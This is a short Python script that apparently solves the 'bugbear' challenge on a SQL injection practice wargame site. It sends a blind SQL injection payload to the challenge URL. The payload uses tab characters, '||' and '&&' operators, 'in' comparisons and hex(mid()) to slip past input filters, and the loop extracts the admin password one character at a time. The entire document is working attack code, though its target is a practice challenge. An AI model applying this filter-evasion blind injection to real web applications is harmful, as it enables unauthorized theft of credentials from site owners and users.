import requests
url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
cookie = {'PHPSESSID' : COOKIE}

for i in range(1, 9):
    for j in range(48, 123):
        req_url = url + f'?no=1||id%09in%09("admin")%26%26hex(mid(pw,{i},1))%09in%09(hex({j}))%23'
        res = requests.get(req_url, cookies=cookie)
        if "<h2>Hello admin</h2>" in res.text:
            print(f"{i}th char : {chr(j)}")
            break
    